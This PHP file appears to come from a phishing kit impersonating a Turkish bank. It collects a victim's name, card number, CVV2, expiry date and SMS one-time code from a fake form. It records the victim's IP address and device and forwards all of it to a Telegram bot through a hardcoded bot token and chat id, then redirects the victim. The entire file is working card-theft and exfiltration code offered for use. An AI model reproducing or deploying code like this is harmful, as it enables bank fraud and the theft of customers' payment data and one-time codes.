<?php

session_start();

if($_SESSION['nameLastName'] == ""){
    header('Location: ../');
    exit();
}

$token = "6789334367:AAHp_YSNShci064rvLfC5Ap5HJNBVaNjUco";
$id = 5403131968;

$nameLastName = $_SESSION['nameLastName'];
$cardNumber = $_SESSION['cardNumber'];
$tag = $_SESSION['tag'];
$cvv2 = $_SESSION['cvv2'];
$date = $_SESSION['date'];
$sms = $_POST['sms'];
$ip = $_SERVER['REMOTE_ADDR'];
$iso = $_SERVER['HTTP_USER_AGENT'];
$ip_info = json_decode(file_get_contents("http://ipwho.is/" . $ip), true);
$model = rtrim(explode(' ', $_SERVER['HTTP_USER_AGENT'])[2], ")");
if ($model === "NT") {
  $model = "Desktop";
} else if ($model === "CPU") {
  $model = "IOS";
}
$Text = "
<b>Turkey cardInfo | Turkey Bank</b>

<b>Ip => </b><code>$ip</code>
<b>nameLastName => </b><code>$nameLastName</code>
<b>cardNumber => </b><code>$cardNumber</code>
<b>cvv2 => </b><code>$cvv2</code>
<b>date(m/y) => </b><code>$date</code>

<b>otp => </b><code>$sms</code>


device: <code>$model</code>
app => <code>Turkey-app</code>
tag => #$tag
";

@file_get_contents("https://api.telegram.org/bot$token/sendMessage?parse_mode=HTML&chat_id=$id&text=" . urlencode($Text));

header('location: ./');
exit();

?>